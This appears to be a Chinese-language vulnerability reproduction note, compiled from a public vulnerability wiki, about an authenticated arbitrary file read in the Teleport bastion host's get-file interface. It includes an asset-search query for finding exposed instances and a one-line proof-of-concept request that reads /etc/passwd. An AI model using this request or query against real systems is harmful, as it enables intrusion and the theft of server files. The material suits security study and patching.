---
title: "Teleport堡垒机 get-file 后台任意文件读取漏洞"
date: 2026-10-18 09:15:22
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Teleport堡垒机-get-file"
tags:
  - "Teleport堡垒机-get-file"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

Teleport堡垒机 get-file接口存在后台任意文件读取漏洞，攻击者利用任意用户登录漏洞后可以获取后台权限，再进一步利用任意文件读取获取服务器上的敏感文件

## 漏洞影响

```
Teleport Version <= 20220817
```

## 网络测绘

```
app="TELEPORT堡垒机"
```

## 漏洞复现

登录页面

![image-20220824134958109](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241355622.png)

登录后使用POC验证

```
/audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&offset=0
```

![image-20220824135554806](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241355866.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
